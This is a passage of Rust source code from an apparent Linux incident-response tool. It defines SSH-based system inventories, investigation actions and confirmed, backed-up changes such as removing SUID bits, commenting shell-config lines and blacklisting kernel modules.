#[derive(Debug, Clone, Eq, PartialEq, Serialize, Deserialize)]
pub struct UserAccountSnapshot {
    pub username: String,
    pub uid: u32,
    pub gid: u32,
    pub home: String,
    pub shell: String,
    pub password_state: UserPasswordState,
    pub session_username: String,
}

#[derive(Debug, Clone, Eq, PartialEq)]
pub struct UserAccountPlan {
    operation: OperationPlan,
    row_id: String,
    snapshot: UserAccountSnapshot,
    action: UserAccountAction,
}

impl UserAccountPlan {
    pub fn definition(&self) -> &OperationPlan {
        &self.operation
    }

    pub fn row_id(&self) -> &str {
        &self.row_id
    }

    pub fn snapshot(&self) -> &UserAccountSnapshot {
        &self.snapshot
    }

    pub const fn action(&self) -> UserAccountAction {
        self.action
    }
}

#[derive(Debug, Clone, Eq, PartialEq)]
pub struct UserAccountOutcome {
    pub username: String,
    pub action: UserAccountAction,
    pub verification: VerificationResult,
    pub restored_after_failed_verification: bool,
}

#[derive(Debug, Clone, Copy, Eq, Hash, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum NetworkInvestigationGroup {
    IpInformation,
    PortAnalysis,
    Diagnostics,
    Security,
    Firewall,
    Logs,
}

impl NetworkInvestigationGroup {
    pub const ALL: [Self; 6] = [
        Self::IpInformation,
        Self::PortAnalysis,
        Self::Diagnostics,
        Self::Security,
        Self::Firewall,
        Self::Logs,
    ];

    pub const fn label(self) -> &'static str {
        match self {
            Self::IpInformation => "IP 信息",
            Self::PortAnalysis => "端口分析",
            Self::Diagnostics => "网络诊断",
            Self::Security => "安全分析",
            Self::Firewall => "防火墙",
            Self::Logs => "日志查询",
        }
    }
}

#[derive(Debug, Clone, Copy, Eq, Hash, Ord, PartialEq, PartialOrd, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum NetworkInvestigationAction {
    Whois,
    Geolocation,
    ReverseDns,
    IpType,
    PortService,
    PortProcess,
    PortConnectivity,
    Ping,
    Traceroute,
    Latency,
    TcpProbe,
    ThreatIntel,
    BlacklistCheck,
    AnomalyDetect,
    ConnectionFrequency,
    FirewallRules,
    ConnectionHistory,
    AccessLogs,
    SecurityLogs,
}

impl NetworkInvestigationAction {
    pub const ALL: [Self; 19] = [
        Self::Whois,
        Self::Geolocation,
        Self::ReverseDns,
        Self::IpType,
        Self::PortService,
        Self::PortProcess,
        Self::PortConnectivity,
        Self::Ping,
        Self::Traceroute,
        Self::Latency,
        Self::TcpProbe,
        Self::ThreatIntel,
        Self::BlacklistCheck,
        Self::AnomalyDetect,
        Self::ConnectionFrequency,
        Self::FirewallRules,
        Self::ConnectionHistory,
        Self::AccessLogs,
        Self::SecurityLogs,
    ];

    pub const fn label(self) -> &'static str {
        match self {
            Self::Whois => "WHOIS 查询",
            Self::Geolocation => "本地 GeoIP 查询",
            Self::ReverseDns => "反向 DNS 查询",
            Self::IpType => "IP 类型判断",
            Self::PortService => "端口服务识别",
            Self::PortProcess => "查看占用进程",
            Self::PortConnectivity => "端口连通性测试",
            Self::Ping => "Ping 测试",
            Self::Traceroute => "Traceroute 追踪",
            Self::Latency => "网络延迟测试",
            Self::TcpProbe => "TCP 连接测试",
            Self::ThreatIntel => "威胁情报准备",
            Self::BlacklistCheck => "DNS 黑名单检查",
            Self::AnomalyDetect => "异常连接检测",
            Self::ConnectionFrequency => "连接频率分析",
            Self::FirewallRules => "查看相关防火墙规则",
            Self::ConnectionHistory => "查看连接历史",
            Self::AccessLogs => "查看访问日志",
            Self::SecurityLogs => "查看安全日志",
        }
    }

    pub const fn group(self) -> NetworkInvestigationGroup {
        match self {
            Self::Whois | Self::Geolocation | Self::ReverseDns | Self::IpType => {
                NetworkInvestigationGroup::IpInformation
            }
            Self::PortService | Self::PortProcess | Self::PortConnectivity => {
                NetworkInvestigationGroup::PortAnalysis
            }
            Self::Ping | Self::Traceroute | Self::Latency | Self::TcpProbe => {
                NetworkInvestigationGroup::Diagnostics
            }
            Self::ThreatIntel
            | Self::BlacklistCheck
            | Self::AnomalyDetect
            | Self::ConnectionFrequency => NetworkInvestigationGroup::Security,
            Self::FirewallRules => NetworkInvestigationGroup::Firewall,
            Self::ConnectionHistory | Self::AccessLogs | Self::SecurityLogs => {
                NetworkInvestigationGroup::Logs
            }
        }
    }

    const fn timeout(self) -> Duration {
        match self {
            Self::Whois | Self::Traceroute | Self::Latency => Duration::from_secs(20),
            _ => Duration::from_secs(15),
        }
    }
}

#[derive(Debug, Clone, Copy, Eq, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum NetworkTransport {
    Tcp,
    Udp,
}

impl NetworkTransport {
    pub const fn label(self) -> &'static str {
        match self {
            Self::Tcp => "TCP",
            Self::Udp => "UDP",
        }
    }
}

#[derive(Debug, Clone, Eq, PartialEq, Serialize, Deserialize)]
pub struct NetworkEndpoint {
    pub address: IpAddr,
    pub port: Option<u16>,
}

#[derive(Debug, Clone, Eq, PartialEq, Serialize, Deserialize)]
pub struct NetworkConnectionIdentity {
    pub tab: SystemInfoTab,
    pub row_id: String,
    pub transport: NetworkTransport,
    pub local: Option<NetworkEndpoint>,
    pub remote: Option<NetworkEndpoint>,
    pub local_display: String,
    pub remote_display: String,
    pub state: String,
    pub process: String,
}

#[derive(Debug, Clone, Eq, PartialEq)]
pub struct NetworkInvestigationRequest {
    identity: NetworkConnectionIdentity,
    action: NetworkInvestigationAction,
}

impl NetworkInvestigationRequest {
    pub fn identity(&self) -> &NetworkConnectionIdentity {
        &self.identity
    }

    pub const fn action(&self) -> NetworkInvestigationAction {
        self.action
    }

    fn command(&self) -> CoreResult<String> {
        network_investigation_command(&self.identity, self.action)
    }
}

#[derive(Debug, Clone, Eq, PartialEq, Serialize, Deserialize)]
pub struct NetworkInvestigationResult {
    pub row_id: String,
    pub action: NetworkInvestigationAction,
    pub output: String,
    pub truncated: bool,
}

#[derive(Debug, Clone, Eq, PartialEq)]
pub struct NetworkDisconnectRequest {
    identity: NetworkConnectionIdentity,
}

impl NetworkDisconnectRequest {
    pub fn identity(&self) -> &NetworkConnectionIdentity {
        &self.identity
    }
}

#[derive(Debug, Clone, Eq, PartialEq, Serialize, Deserialize)]
pub struct NetworkConnectionSnapshot {
    pub local_display: String,
    pub remote_display: String,
    pub state: String,
    pub process_sha256: String,
}

#[derive(Debug, Clone, Eq, PartialEq)]
pub struct NetworkDisconnectPlan {
    operation: OperationPlan,
    identity: NetworkConnectionIdentity,
    snapshot: NetworkConnectionSnapshot,
}

impl NetworkDisconnectPlan {
    pub fn definition(&self) -> &OperationPlan {
        &self.operation
    }

    pub fn identity(&self) -> &NetworkConnectionIdentity {
        &self.identity
    }

    pub fn snapshot(&self) -> &NetworkConnectionSnapshot {
        &self.snapshot
    }
}

#[derive(Debug, Clone, Eq, PartialEq)]
pub struct NetworkDisconnectOutcome {
    pub row_id: String,
    pub verification: VerificationResult,
}

impl SystemInfoTable {
    fn process_row(&self, row_id: &str) -> CoreResult<(&SystemInfoRow, u32)> {
        if self.tab != SystemInfoTab::Processes {
            return Err(CoreError::validation(
                "process operation",
                "the selected row is not from the process inventory",
            ));
        }
        let row = self
            .rows
            .iter()
            .find(|row| row.id == row_id)
            .ok_or_else(|| CoreError::NotFound {
                entity: "system information row",
                id: bounded_text(row_id, 256),
            })?;
        let pid = row
            .cells
            .get(1)
            .filter(|value| is_valid_pid(value))
            .ok_or_else(|| invalid_detail_key("process PID"))?
            .parse()
            .map_err(|_| invalid_detail_key("process PID"))?;
        Ok((row, pid))
    }

    pub fn process_investigation_request(
        &self,
        row_id: &str,
        action: ProcessInvestigationAction,
    ) -> CoreResult<ProcessInvestigationRequest> {
        let (row, pid) = self.process_row(row_id)?;
        Ok(ProcessInvestigationRequest {
            row_id: row.id.clone(),
            pid,
            action,
        })
    }

    pub fn process_signal_request(
        &self,
        row_id: &str,
        signal: ProcessSignal,
    ) -> CoreResult<ProcessSignalRequest> {
        let (row, pid) = self.process_row(row_id)?;
        Ok(ProcessSignalRequest {
            row_id: row.id.clone(),
            pid,
            signal,
        })
    }

    fn service_row(&self, row_id: &str) -> CoreResult<(&SystemInfoRow, String)> {
        if self.tab != SystemInfoTab::Services {
            return Err(CoreError::validation(
                "service operation",
                "the selected row is not from the service inventory",
            ));
        }
        let row = self
            .rows
            .iter()
            .find(|row| row.id == row_id)
            .ok_or_else(|| CoreError::NotFound {
                entity: "system information row",
                id: bounded_text(row_id, 256),
            })?;
        let unit = row
            .cells
            .first()
            .filter(|unit| is_valid_unit_name(unit))
            .ok_or_else(|| invalid_detail_key("systemd unit name"))?
            .clone();
        Ok((row, unit))
    }

    fn runtime_unit_row(&self, row_id: &str) -> CoreResult<(&SystemInfoRow, String)> {
        if self.tab == SystemInfoTab::Services {
            return self.service_row(row_id);
        }
        let row = self
            .rows
            .iter()
            .find(|row| row.id == row_id)
            .ok_or_else(|| CoreError::NotFound {
                entity: "system information row",
                id: bounded_text(row_id, 256),
            })?;
        let unit = row
            .cells
            .first()
            .ok_or_else(|| invalid_detail_key("systemd unit name"))?;
        match self.tab {
            SystemInfoTab::Autostart
                if is_valid_service_unit(unit)
                    && row.cells.get(3).is_some_and(|kind| kind == "systemd") => {}
            SystemInfoTab::Timers if is_valid_timer_unit(unit) => {}
            _ => {
                return Err(CoreError::validation(
                    "service runtime",
                    "the selected row is not a supported systemd service, startup, or timer row",
                ));
            }
        }
        Ok((row, unit.clone()))
    }

    pub fn service_investigation_request(
        &self,
        row_id: &str,
        action: ServiceInvestigationAction,
    ) -> CoreResult<ServiceInvestigationRequest> {
        let (row, unit) = self.service_row(row_id)?;
        Ok(ServiceInvestigationRequest {
            row_id: row.id.clone(),
            unit,
            action,
        })
    }

    pub fn service_runtime_request(
        &self,
        row_id: &str,
        action: ServiceRuntimeAction,
    ) -> CoreResult<ServiceRuntimeRequest> {
        let (row, unit) = self.runtime_unit_row(row_id)?;
        let allowed = match self.tab {
            SystemInfoTab::Services => ServiceRuntimeAction::ALL.contains(&action),
            SystemInfoTab::Autostart => ServiceRuntimeAction::AUTOSTART.contains(&action),
            SystemInfoTab::Timers => ServiceRuntimeAction::TIMER.contains(&action),
            _ => false,
        };
        if !allowed {
            return Err(CoreError::validation(
                "service runtime",
                "the requested action is not available for this systemd inventory",
            ));
        }
        Ok(ServiceRuntimeRequest {
            row_id: row.id.clone(),
            unit,
            action,
        })
    }

    pub fn user_identity(&self, row_id: &str) -> CoreResult<UserIdentity> {
        user_identity_from_table(self, row_id)
    }

    pub fn user_investigation_request(
        &self,
        row_id: &str,
        action: UserInvestigationAction,
    ) -> CoreResult<UserInvestigationRequest> {
        let identity = self.user_identity(row_id)?;
        Ok(UserInvestigationRequest { identity, action })
    }

    pub fn login_identity(&self, row_id: &str) -> CoreResult<LoginIdentity> {
        login_identity_from_table(self, row_id)
    }

    pub fn login_investigation_request(
        &self,
        row_id: &str,
        action: LoginInvestigationAction,
    ) -> CoreResult<LoginInvestigationRequest> {
        let identity = self.login_identity(row_id)?;
        if action.requires_source() && identity.source.is_none() {
            return Err(CoreError::validation(
                "login history investigation",
                "the selected row does not contain a validated source IP address",
            ));
        }
        Ok(LoginInvestigationRequest { identity, action })
    }

    pub fn artifact_investigation_request(
        &self,
        row_id: &str,
        action: ArtifactInvestigationAction,
    ) -> CoreResult<ArtifactInvestigationRequest> {
        if self.tab != action.tab() {
            return Err(CoreError::validation(
                "system artifact investigation",
                "the action does not belong to the selected inventory",
            ));
        }
        let row = self
            .rows
            .iter()
            .find(|row| row.id == row_id)
            .ok_or_else(|| CoreError::NotFound {
                entity: "system information row",
                id: bounded_text(row_id, 256),
            })?;
        let cell = |index: usize, subject: &'static str| {
            row.cells
                .get(index)
                .map(String::as_str)
                .ok_or_else(|| invalid_detail_key(subject))
        };
        let name = cell(0, "system artifact identity")?;
        let identity = match action {
            ArtifactInvestigationAction::Package(_) if is_valid_package_name(name) => {
                ArtifactIdentity::Package {
                    row_id: row.id.clone(),
                    name: name.to_owned(),
                }
            }
            ArtifactInvestigationAction::KernelModule(_) if is_valid_module_name(name) => {
                ArtifactIdentity::KernelModule {
                    row_id: row.id.clone(),
                    name: name.to_owned(),
                }
            }
            ArtifactInvestigationAction::Environment(action)
                if is_valid_environment_name(name)
                    && (action != EnvVarInvestigationAction::PathDirectories || name == "PATH") =>
            {
                ArtifactIdentity::Environment {
                    row_id: row.id.clone(),
                    name: name.to_owned(),
                }
            }
            ArtifactInvestigationAction::Environment(
                EnvVarInvestigationAction::PathDirectories,
            ) => {
                return Err(CoreError::validation(
                    "environment investigation",
                    "PATH directory inspection is only valid for the PATH variable",
                ));
            }
            ArtifactInvestigationAction::Startup(_) if is_valid_service_unit(name) => {
                if cell(3, "startup type")? != "systemd" {
                    return Err(CoreError::validation(
                        "startup investigation",
                        "only systemd startup rows are supported",
                    ));
                }
                ArtifactIdentity::Startup {
                    row_id: row.id.clone(),
                    unit: name.to_owned(),
                }
            }
            ArtifactInvestigationAction::Cron(_) => ArtifactIdentity::Cron {
                row_id: row.id.clone(),
                username: validated_username(cell(0, "cron username")?)?,
                schedule: validated_cron_schedule(cell(1, "cron schedule")?)?,
                command: validated_inert_command(cell(2, "cron command")?)?,
                source: validated_cron_source(cell(3, "cron source")?)?,
            },
            ArtifactInvestigationAction::Timer(_) if is_valid_timer_unit(name) => {
                let trigger = cell(4, "timer trigger unit")?;
                if !is_valid_unit_name(trigger) {
                    return Err(invalid_detail_key("timer trigger unit"));
                }
                ArtifactIdentity::Timer {
                    row_id: row.id.clone(),
                    timer: name.to_owned(),
                    trigger: trigger.to_owned(),
                }
            }
            ArtifactInvestigationAction::ShellConfig(_) => ArtifactIdentity::ShellConfig {
                row_id: row.id.clone(),
                path: validated_shell_config_path(name)?,
                line: validated_line_number(cell(3, "shell configuration line")?)?,
            },
            ArtifactInvestigationAction::Sudoers(action) => {
                let principal = validated_sudo_principal(name)?;
                let username = is_valid_username(&principal).then_some(principal.clone());
                if action.requires_username() && username.is_none() {
                    return Err(CoreError::validation(
                        "sudoers investigation",
                        "the selected principal is not a concrete Linux username",
                    ));
                }
                ArtifactIdentity::Sudoers {
                    row_id: row.id.clone(),
                    principal,
                    username,
                    source: validated_sudoers_source(cell(4, "sudoers source")?)?,
                }
            }
            ArtifactInvestigationAction::SuidFile(_) => ArtifactIdentity::SuidFile {
                row_id: row.id.clone(),
                path: validated_absolute_path(name)?,
            },
            ArtifactInvestigationAction::SshKey(_) => {
                let username = validated_username(name)?;
                let key_type = cell(1, "SSH key type")?;
                let key_content = cell(2, "SSH key content")?;
                if !is_valid_ssh_key_type(key_type) || !is_valid_ssh_key_content(key_content) {
                    return Err(invalid_detail_key("SSH public key"));
                }
                ArtifactIdentity::SshKey {
                    row_id: row.id.clone(),
                    path: validated_authorized_keys_path(cell(4, "authorized_keys path")?)?,
                    username,
                    key_type: key_type.to_owned(),
                    key_content: key_content.to_owned(),
                }
            }
            _ => return Err(invalid_detail_key("system artifact identity")),
        };
        Ok(ArtifactInvestigationRequest { identity, action })
    }

    pub fn artifact_mutation_request(
        &self,
        row_id: &str,
        action: ArtifactMutationAction,
    ) -> CoreResult<ArtifactMutationRequest> {
        if self.tab != action.tab() {
            return Err(CoreError::validation(
                "system artifact mutation",
                "the action does not belong to the selected inventory",
            ));
        }
        let row = self
            .rows
            .iter()
            .find(|row| row.id == row_id)
            .ok_or_else(|| CoreError::NotFound {
                entity: "system information row",
                id: bounded_text(row_id, 256),
            })?;
        let cell = |index: usize, subject: &'static str| {
            row.cells
                .get(index)
                .map(String::as_str)
                .ok_or_else(|| invalid_detail_key(subject))
        };
        let identity = match action {
            ArtifactMutationAction::DeleteCronFile => {
                let path = validated_deletable_cron_path(cell(3, "cron source file")?)?;
                ArtifactMutationIdentity::CronFile {
                    row_id: row.id.clone(),
                    path,
                }
            }
            ArtifactMutationAction::CommentShellLine => {
                let path = RemotePath::new(validated_shell_config_path(cell(
                    0,
                    "shell configuration path",
                )?)?)?;
                let line = validated_line_number(cell(3, "shell configuration line")?)?;
                let displayed_content = validated_shell_line(cell(4, "shell configuration line")?)?;
                if displayed_content.trim_start().starts_with('#') {
                    return Err(CoreError::validation(
                        "shell configuration mutation",
                        "the selected line is already a comment",
                    ));
                }
                ArtifactMutationIdentity::ShellLine {
                    row_id: row.id.clone(),
                    path,
                    line,
                    displayed_content,
                }
            }
            ArtifactMutationAction::RemoveSuidBits | ArtifactMutationAction::QuarantineSuidFile => {
                let path = validated_suid_path(cell(0, "SUID file path")?)?;
                let displayed_mode = validated_octal_mode(cell(1, "SUID file mode")?)?;
                if displayed_mode & 0o6000 == 0 {
                    return Err(CoreError::validation(
                        "SUID file mutation",
                        "the selected row no longer carries SUID or SGID bits",
                    ));
                }
                ArtifactMutationIdentity::SuidFile {
                    row_id: row.id.clone(),
                    path,
                    displayed_mode,
                }
            }
            ArtifactMutationAction::AddManagedModuleBlacklist
            | ArtifactMutationAction::RemoveManagedModuleBlacklist => {
                let module = cell(0, "kernel module name")?;
                if !is_valid_module_name(module) {
                    return Err(invalid_detail_key("kernel module name"));
                }
                ArtifactMutationIdentity::KernelModulePolicy {
                    row_id: row.id.clone(),
                    module: module.to_owned(),
                    path: managed_module_policy_path(module)?,
                }
            }
        };
        Ok(ArtifactMutationRequest { identity, action })
    }

    pub fn user_account_request(
        &self,
        row_id: &str,
        action: UserAccountAction,
    ) -> CoreResult<UserAccountRequest> {
        let (row_id, username) = match self.tab {
            SystemInfoTab::Users => {
                let identity = self.user_identity(row_id)?;
                (identity.row_id, identity.username)
            }
            SystemInfoTab::LoginHistory => {
                let identity = self.login_identity(row_id)?;
                (identity.row_id, identity.username)
            }
            _ => {
                return Err(CoreError::validation(
                    "user account operation",
                    "the selected row is not from a user or login-history inventory",
                ));
            }
        };
        Ok(UserAccountRequest {
            row_id,
            username,
            action,
        })
    }

    pub fn network_identity(&self, row_id: &str) -> CoreResult<NetworkConnectionIdentity> {
        network_identity_from_table(self, row_id)
    }

    pub fn network_investigation_request(
        &self,
        row_id: &str,
        action: NetworkInvestigationAction,
    ) -> CoreResult<NetworkInvestigationRequest> {
        let identity = self.network_identity(row_id)?;
        validate_network_action(&identity, action)?;
        Ok(NetworkInvestigationRequest { identity, action })
    }

    pub fn network_disconnect_request(&self, row_id: &str) -> CoreResult<NetworkDisconnectRequest> {
        let identity = self.network_identity(row_id)?;
        validate_network_disconnect(&identity)?;
        Ok(NetworkDisconnectRequest { identity })
    }
}

#[derive(Debug, Clone, Default, Eq, PartialEq, Serialize, Deserialize)]
pub struct SystemInfoSummary {
    pub hostname: String,
    pub operating_system: String,
    pub kernel: String,
    pub architecture: String,
    pub virtualization: String,
    pub boot_time: String,
    pub timezone: String,
    pub locale: String,
    pub init_system: String,
    pub package_manager: String,
    pub selinux: String,
    pub apparmor: String,
    pub uptime_seconds: u64,
    pub load_average: [String; 3],
    pub cpu_model: String,
    pub cpu_cores: u32,
    pub memory_total_bytes: u64,
    pub memory_available_bytes: u64,
    pub swap_total_bytes: u64,
    pub swap_free_bytes: u64,
    pub root_device: String,
    pub root_filesystem: String,
    pub root_total_bytes: u64,
    pub root_available_bytes: u64,
    pub primary_ip: String,
    pub default_gateway: String,
    pub dns_servers: String,
    pub process_count: usize,
    pub logged_in_users: usize,
    pub network_connections: usize,
    pub received_bytes: u64,
    pub transmitted_bytes: u64,
}

#[derive(Debug, Clone)]
pub struct SystemInfoService {
    ssh: SshService,
    sftp: SftpService,
    target: Arc<TargetContext>,
}

impl SystemInfoService {
    pub fn new(ssh: SshService, sftp: SftpService, target: Arc<TargetContext>) -> Self {
        Self { ssh, sftp, target }
    }

    pub async fn summary(&self, session: &BoundSshSession) -> CoreResult<SystemInfoSummary> {
        self.target.validate(session.target())?;
        let output = self
            .ssh
            .execute_bound(session, SUMMARY_COMMAND.to_owned(), Duration::from_secs(15))
            .await?;
        self.target.validate(session.target())?;
        if output.timed_out || output.exit_code.is_some_and(|code| code != 0) {
            return Err(command_failed("system summary", &output));
        }
        parse_summary(&output.output)
    }

    pub async fn collect(
        &self,
        session: &BoundSshSession,
        request: &SystemInfoRequest,
    ) -> CoreResult<SystemInfoTable> {
        if !(1..=MAX_ROWS).contains(&request.maximum_rows) {
            return Err(CoreError::Validation {
                subject: "system information row limit",
                message: format!("must be between 1 and {MAX_ROWS}"),
            });
        }
        self.target.validate(session.target())?;
        let output = self
            .ssh
            .execute_bound(
                session,
                request.tab.command().to_owned(),
                request.tab.timeout(),
            )
            .await?;
        self.target.validate(session.target())?;
        if output.timed_out {
            return Err(command_failed(request.tab.label(), &output));
        }
        // Many inventory commands deliberately degrade when an optional tool is
        // absent. Their output remains useful even if the final fallback exits 1.
        Ok(parse_table(request, &output.output))
    }

    pub async fn detail(
        &self,
        session: &BoundSshSession,
        request: &SystemInfoDetailRequest,
    ) -> CoreResult<SystemInfoDetail> {
        self.target.validate(session.target())?;
        let output = self
            .ssh
            .execute_bound(session, request.command(), Duration::from_secs(15))
            .await?;
        self.target.validate(session.target())?;
        if output.timed_out {
            return Err(command_failed("system information detail", &output));
        }
        Ok(parse_detail(request, &output.output))
    }

    pub async fn investigate_process(
        &self,
        session: &BoundSshSession,
        request: &ProcessInvestigationRequest,
    ) -> CoreResult<ProcessInvestigationResult> {
        self.target.validate(session.target())?;
        let output = self
            .ssh
            .execute_bound(session, request.command(), request.action.timeout())
            .await?;
        self.target.validate(session.target())?;
        if output.timed_out || output.exit_code.is_some_and(|code| code != 0) {
            return Err(command_failed("process investigation", &output));
        }
        let (bounded, truncated) = bounded_process_output(&output.output);
        Ok(ProcessInvestigationResult {
            row_id: request.row_id.clone(),
            pid: request.pid,
            action: request.action,
            output: bounded,
            truncated,
        })
    }

    pub async fn investigate_service(
        &self,
        session: &BoundSshSession,
        request: &ServiceInvestigationRequest,
    ) -> CoreResult<ServiceInvestigationResult> {
        self.target.validate(session.target())?;
        let output = self
            .ssh
            .execute_bound(session, request.command(), request.action.timeout())
            .await?;
        self.target.validate(session.target())?;
        if output.timed_out || output.exit_code.is_some_and(|code| code != 0) {
            return Err(command_failed("service investigation", &output));
        }
        let (bounded, truncated) = bounded_service_output(&output.output);
        Ok(ServiceInvestigationResult {
            row_id: request.row_id.clone(),
            unit: request.unit.clone(),
            action: request.action,
            output: bounded,
            truncated,
        })
    }

    pub async fn investigate_user(
        &self,
        session: &BoundSshSession,
        request: &UserInvestigationRequest,
    ) -> CoreResult<UserInvestigationResult> {
        self.target.validate(session.target())?;
        let output = self
            .ssh
            .execute_bound(session, request.command(), request.action.timeout())
            .await?;
        self.target.validate(session.target())?;
        if output.timed_out || output.exit_code.is_some_and(|code| code != 0) {
            return Err(command_failed("user investigation", &output));
        }
        let (bounded, truncated) = bounded_user_output(&output.output);
        Ok(UserInvestigationResult {
            row_id: request.identity.row_id.clone(),
            username: request.identity.username.clone(),
            action: request.action,
            output: bounded,
            truncated,
        })
    }

    pub async fn investigate_login(
        &self,
        session: &BoundSshSession,
        request: &LoginInvestigationRequest,
    ) -> CoreResult<LoginInvestigationResult> {
        self.target.validate(session.target())?;
        let output = self
            .ssh
            .execute_bound(session, request.command()?, request.action.timeout())
            .await?;
        self.target.validate(session.target())?;
        if output.timed_out || output.exit_code.is_some_and(|code| code != 0) {
            return Err(command_failed("login-history investigation", &output));
        }
        let (bounded, truncated) = bounded_login_output(&output.output);
        Ok(LoginInvestigationResult {
            row_id: request.identity.row_id.clone(),
            username: request.identity.username.clone(),
            source: request.identity.source,
            action: request.action,
            output: bounded,
            truncated,
        })
    }

    pub async fn investigate_artifact(
        &self,
        session: &BoundSshSession,
        request: &ArtifactInvestigationRequest,
    ) -> CoreResult<ArtifactInvestigationResult> {
        self.target.validate(session.target())?;
        let output = self
            .ssh
            .execute_bound(session, request.command()?, request.action.timeout())
            .await?;
        self.target.validate(session.target())?;
        if output.timed_out || output.exit_code.is_some_and(|code| code != 0) {
            return Err(command_failed("system artifact investigation", &output));
        }
        let (bounded, truncated) = bounded_artifact_output(&output.output);
        Ok(ArtifactInvestigationResult {
            row_id: request.identity.row_id().to_owned(),
            action: request.action,
            output: bounded,
            truncated,
        })
    }

    pub async fn plan_artifact_mutation(
        &self,
        session: &BoundSshSession,
        request: &ArtifactMutationRequest,
    ) -> CoreResult<ArtifactMutationPlan> {
        self.target.validate(session.target())?;
        let kind = match &request.identity {
            ArtifactMutationIdentity::CronFile { path, .. } => {
                let bound = self
                    .sftp
                    .bind_session(session.target().clone(), session.session_id())
                    .await?;
                let content = self.sftp.read_file(&bound, path).await?;
                if content.is_empty() {
                    return Err(CoreError::validation(
                        "cron file mutation",
                        "refuses to remove an empty or unreadable cron file",
                    ));
                }
                ArtifactMutationPlanKind::Sftp(Box::new(self.sftp.plan(
                    &bound,
                    SftpMutation::RemoveFileIfMatch {
                        path: path.clone(),
                        expected_sha256: content_sha256(&content),
                    },
                )?))
            }
            ArtifactMutationIdentity::ShellLine {
                path,
                line,
                displayed_content,
                ..
            } => {
                let bound = self
                    .sftp
                    .bind_session(session.target().clone(), session.session_id())
                    .await?;
                let content = self.sftp.read_file(&bound, path).await?;
                let replacement = comment_shell_line(&content, *line, displayed_content)?;
                ArtifactMutationPlanKind::Sftp(Box::new(self.sftp.plan(
                    &bound,
                    SftpMutation::AtomicWriteIfMatch {
                        path: path.clone(),
                        expected_sha256: content_sha256(&content),
                        expected_canonical_path: None,
                        backup_directory: None,
                        content: replacement,
                    },
                )?))
            }
            ArtifactMutationIdentity::SuidFile {
                path,
                displayed_mode,
                ..
            } => {
                let snapshot = self.suid_file_snapshot(session, path).await?;
                if snapshot.mode != *displayed_mode || snapshot.mode & 0o6000 == 0 {
                    return Err(CoreError::validation(
                        "SUID file mutation",
                        "file mode changed after the inventory row was collected",
                    ));
                }
                let target_mode = match request.action {
                    ArtifactMutationAction::RemoveSuidBits => snapshot.mode & !0o6000,
                    ArtifactMutationAction::QuarantineSuidFile => 0,
                    _ => unreachable!("validated SUID mutation action"),
                };
                let backup_directory = path.parent()?.child(".lovelyres-backups")?;
                let backup_path =
                    backup_directory.child(&format!("{}-{}", Uuid::new_v4(), path.file_name()?))?;
                let mut operation = OperationPlan::new(
                    session.target().clone(),
                    format!(
                        "{} {}（当前模式 {:04o}，SHA-256 {}）。先写入受管备份 {}，再修改同一文件描述符的权限；内容或身份变化将拒绝执行。",
                        request.action.label(),
                        path.as_str(),
                        snapshot.mode,
                        snapshot.sha256,
                        backup_path.as_str(),
                    ),
                    true,
                    Some(format!(
                        "验证原文件与受管备份后，将 {} 的权限恢复为 {:04o}。",
                        path.as_str(),
                        snapshot.mode
                    )),
                )?;
                operation
                    .metadata
                    .insert("source".to_owned(), "system-info-suid".to_owned());
                operation
                    .metadata
                    .insert("path".to_owned(), path.as_str().to_owned());
                operation
                    .metadata
                    .insert("action".to_owned(), format!("{:?}", request.action));
                operation
                    .metadata
                    .insert("snapshot-sha256".to_owned(), snapshot.sha256.clone());
                operation
                    .metadata
                    .insert("backup-path".to_owned(), backup_path.as_str().to_owned());
                ArtifactMutationPlanKind::Suid(Box::new(SuidPermissionPlan {
                    operation,
                    snapshot,
                    target_mode,
                    backup_directory,
                    backup_path,
                }))
            }
            ArtifactMutationIdentity::KernelModulePolicy { module, path, .. } => {
                let bound = self
                    .sftp
                    .bind_session(session.target().clone(), session.session_id())
                    .await?;
                let expected_content = managed_module_policy_content(module)?;
                let mutation = match request.action {
                    ArtifactMutationAction::AddManagedModuleBlacklist => {
                        if self.sftp.exists(&bound, path).await? {
                            return Err(CoreError::validation(
                                "kernel module policy",
                                "the managed policy path already exists; inspect or remove it before creating a new policy",
                            ));
                        }
                        SftpMutation::CreateFile {
                            path: path.clone(),
                            content: expected_content,
                            mode: Some(0o644),
                        }
                    }
                    ArtifactMutationAction::RemoveManagedModuleBlacklist => {
                        if !self.sftp.exists(&bound, path).await? {
                            return Err(CoreError::NotFound {
                                entity: "LovelyRes kernel module policy",
                                id: path.as_str().to_owned(),
                            });
                        }
                        let content = self.sftp.read_file(&bound, path).await?;
                        if content != expected_content {
                            return Err(CoreError::validation(
                                "kernel module policy",
                                "refuses to remove a policy that is not the exact LovelyRes-managed content",
                            ));
                        }
                        SftpMutation::RemoveFileIfMatch {
                            path: path.clone(),
                            expected_sha256: content_sha256(&content),
                        }
                    }
                    _ => unreachable!("validated kernel module policy action"),
                };
                ArtifactMutationPlanKind::Sftp(Box::new(self.sftp.plan(&bound, mutation)?))
            }
        };
        self.target.validate(session.target())?;
        Ok(ArtifactMutationPlan {
            row_id: request.row_id().to_owned(),
            action: request.action,
            path: request.path().clone(),
            kind,
        })
    }

    pub async fn execute_artifact_mutation(
        &self,
        session: &BoundSshSession,
        plan: ArtifactMutationPlan,
        confirmation: DangerousConfirmation,
        journal: &dyn OperationJournal,
    ) -> CoreResult<ArtifactMutationOutcome> {
        let row_id = plan.row_id;
        let action = plan.action;
        let path = plan.path;
        let (verification, restored_after_failed_verification) = match plan.kind {
            ArtifactMutationPlanKind::Sftp(mut operation) => {
                operation.confirm(confirmation)?;
                let verification = match operation.execute_and_verify().await {
                    Ok(verification) => verification,
                    Err(error) if operation.state() == OperationState::VerificationFailed => {
                        return match operation.restore().await {
                            Ok(()) => Err(error),
                            Err(restore_error) => Err(CoreError::validation(
                                "system artifact verification",
                                format!("{error}; automatic restore also failed: {restore_error}"),
                            )),
                        };
                    }
                    Err(error) => return Err(error),
                };
                if verification.passed {
                    (verification, false)
                } else {
                    operation.restore().await?;
                    (verification, true)
                }
            }
            ArtifactMutationPlanKind::Suid(permission_plan) => {
                let executor = SuidPermissionExecutor {
                    service: self,
                    session,
                    plan: &permission_plan,
                };
                let mut operation = PlannedOperation::plan(permission_plan.operation.clone());
                operation.confirm(confirmation)?;
